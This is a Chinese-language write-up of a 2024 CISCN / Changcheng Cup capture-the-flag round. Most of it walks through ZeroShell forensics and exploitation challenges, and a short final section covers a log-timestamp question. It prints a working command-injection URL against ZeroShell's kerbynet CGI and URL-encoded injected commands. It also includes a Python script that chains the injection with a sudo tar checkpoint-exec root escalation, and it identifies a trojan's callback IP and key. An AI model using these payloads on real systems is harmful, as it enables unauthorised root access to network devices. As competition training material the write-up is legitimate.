# 2024 CISCN &amp; 长城杯铁人三项 部分 Wp

# 前言
为队友做了一些贡献，解题很少请大家多多体谅
## zeroshell_1
1. 从数据包中找出攻击者利用漏洞开展攻击的会话（攻击者执行了一条命令），写出该会话中设置的flag, 结果提交形式：flag{xxxxxxxxx}

根据网站特征分析可能存在历史漏洞，百度搜索找到相关漏洞利用

[https://zhuanlan.zhihu.com/p/630496065](https://zhuanlan.zhihu.com/p/630496065)

![img](https://cdn.ctfer.fun/gh/youcs233/blog-img/cdnimg/20241216205739007.png &#34;img&#34;)

链接：[http://61.139.2.100/cgi-bin/kerbynet?Action=x509view&amp;Section=NoAuthREQ&amp;User=&amp;x509type=%27%0Aid%0A%27](http://61.139.2.100/cgi-bin/kerbynet?Action=x509view&amp;Section=NoAuthREQ&amp;User=&amp;x509type=%27%0Aid%0A%27)
访问后，确认存在该漏洞

![img](https://cdn.ctfer.fun/gh/youcs233/blog-img/cdnimg/20241216205827328.png &#34;img&#34;)

流量分析语句：
http.request.method == &#34;GET&#34;，再通过 Ctrl&#43;F 切换为字符串，搜索 type

![img](https://cdn.ctfer.fun/gh/youcs233/blog-img/cdnimg/20241216205851735.png &#34;img&#34;)

打开数据包，通过题目描述，疑似如会话(Session)这种长度格式，尝试解密

![img](https://cdn.ctfer.fun/gh/youcs233/blog-img/cdnimg/20241216205914892.png &#34;img&#34;)

结果

![img](https://cdn.ctfer.fun/gh/youcs233/blog-img/cdnimg/20241216205931218.png &#34;img&#34;)

flag{6C2E38DA-D8E4-8D84-4A4F-E2ABD07A1F3A}
### zeroshell_2
2. 通过漏洞利用获取设备控制权限，然后查找设备上的flag文件，提取flag文件内容，结果提交形式：flag{xxxxxxxxxx}

根据之前的流量包，我们可以知道攻击者利用了 [sudo](https://blog.csdn.net/negnegil/article/details/120090266) 提权，我们可以直接拿过来使用

![img](https://cdn.ctfer.fun/gh/youcs233/blog-img/cdnimg/20241216210233737.png &#34;img&#34;)

通过测试可以知道提权成功，返回的结果是 uid=0(root)，root 为超级用户

![img](https://cdn.ctfer.fun/gh/youcs233/blog-img/cdnimg/20241216210251642.png &#34;img&#34;)

通过分析漏洞生成的 URL，对命令进行加密
第一步，查找 flag 文件
未加密前：
&#39;find / type f -name &#34;flag&#34;&#39;
&#39;
URL 加密后：
%27find%20%2F%20type%20f%20-name%20%22flag%22%27%0A%27
运行结果

![img](https://cdn.ctfer.fun/gh/youcs233/blog-img/cdnimg/20241216210412107.png &#34;img&#34;)


第二步，查看 flag 文件
cat /DB/_Db.001/flag
%27cat%20%2FDB%2F_Db.001%2Fflag%27%0A%27

![img](https://cdn.ctfer.fun/gh/youcs233/blog-img/cdnimg/20241216210446810.png &#34;img&#34;)

flag{c6045425-6e6e-41d0-be09-95682a4f65c4}

## zeroshell_3
3. 找出受控机防火墙设备中驻留木马的外联域名或IP地址，结果提交形式：flag{xxxx}，如flag{www\.abc.com} 或 flag{16.122.33.44}

根据题目内容，觉得可能是通过运行木马然后查看回连地址
ls -al 查看当前目录的文件，发现 kerbynet

![img](https://cdn.ctfer.fun/gh/youcs233/blog-img/cdnimg/20241216210807440.png &#34;img&#34;)

cat kerbynet 查看文件，发现是 ELF，怀疑是木马

![img](https://cdn.ctfer.fun/gh/youcs233/blog-img/cdnimg/20241216210824178.png &#34;img&#34;)

思路，尝试运行这个文件，然后通过 netstat -antlp 查看是否存在回连地址

第一步，运行 ./kerbynet

![img](https://cdn.ctfer.fun/gh/youcs233/blog-img/cdnimg/20241216210847073.png &#34;img&#34;)

第二步，查看 netstat -antlp

![img](https://cdn.ctfer.fun/gh/youcs233/blog-img/cdnimg/20241216210902843.png &#34;img&#34;)

flag{202.115.89.103}

## zeroshell_4
4. 请写出木马进程执行的本体文件的名称，结果提交形式：flag{xxxxx}，仅写文件名不加路径

根据题目内容，怀疑是 kerbynet 的本体文件

在第三步的前提上，运行了 ./kerbynet 后
ps -T -p 10937

![img](https://cdn.ctfer.fun/gh/youcs233/blog-img/cdnimg/20241216211105798.png &#34;img&#34;)

查找木马进程执行的本体文件
find / -name &#34;.nginx&#34;

![img](https://cdn.ctfer.fun/gh/youcs233/blog-img/cdnimg/20241216211127254.png &#34;img&#34;)

flag{.nginx}

## zeroshell_5
5. 请提取驻留的木马本体文件，通过逆向分析找出木马样本通信使用的加密密钥，结果提交形式：flag{xxxx}

根据题目内容，猜测是逆向找字符串

首先
cat /tmp/.nginx，查看文件是 ELF。通过之前的题目，确认是木马文件

![img](https://cdn.ctfer.fun/gh/youcs233/blog-img/cdnimg/20241216211222912.png &#34;img&#34;)

使用 python 脚本提取响应另存为文件

```python
import requests  
url = &#34;http://61.139.2.100/cgi-bin/kerbynet?Action=x509view&amp;Section=NoAuthREQ&amp;User=&amp;x509type=%27%0A/etc/sudo%20tar%20-cf%20/dev/null%20/dev/null%20--checkpoint=1%20--checkpoint-action=exec=%27cat%20%2Ftmp%2F.nginx%27%0A%27&#34;  
resp = requests.get(url)  
  
if resp.status_code == 200:  
   with open(&#39;nginx&#39;,&#39;wb&#39;) as f:  
       f.write(resp.content)  
   print(&#34;文件保存成功&#34;)  
else:  
   print(&#34;文件保存失败&#34;)
```

通过微步云沙箱分析，确认是木马文件

![img](https://cdn.ctfer.fun/gh/youcs233/blog-img/cdnimg/20241216211317342.png &#34;img&#34;)

通过查壳工具，确认为32位程序

![img](https://cdn.ctfer.fun/gh/youcs233/blog-img/cdnimg/20241216211333406.png &#34;img&#34;)

打开 IDA 32拖入程序后，Shift&#43;12 查看所有字符串，挨个查看发现密钥字符串

![img](https://cdn.ctfer.fun/gh/youcs233/blog-img/cdnimg/20241216211345825.png &#34;img&#34;)

flag{11223344qweasdzxc}

## sc05_1
问题1：IP1地址首次被请求时间是多久？计算内容如：2020/05/18_19:35:10 提交格式：flag{32位大写MD5值}

通过题目描述，可以使用筛选，目的IP 筛选 134.6.4.12 和 开始时间进行升序排列

![img](https://cdn.ctfer.fun/gh/youcs233/blog-img/cdnimg/20241216221412635.png &#34;img&#34;)

MD5后的结果

![img](https://cdn.ctfer.fun/gh/youcs233/blog-img/cdnimg/20241216221424412.png &#34;img&#34;)

再大写

![img](https://cdn.ctfer.fun/gh/youcs233/blog-img/cdnimg/20241216221438912.png &#34;img&#34;)

flag{01DF5BC2388E287D4CC8F11EA4D31929}

---

> 作者: Youcs  
> URL: http://youcs233.github.io/posts/ciscn-changcheng-wp/  

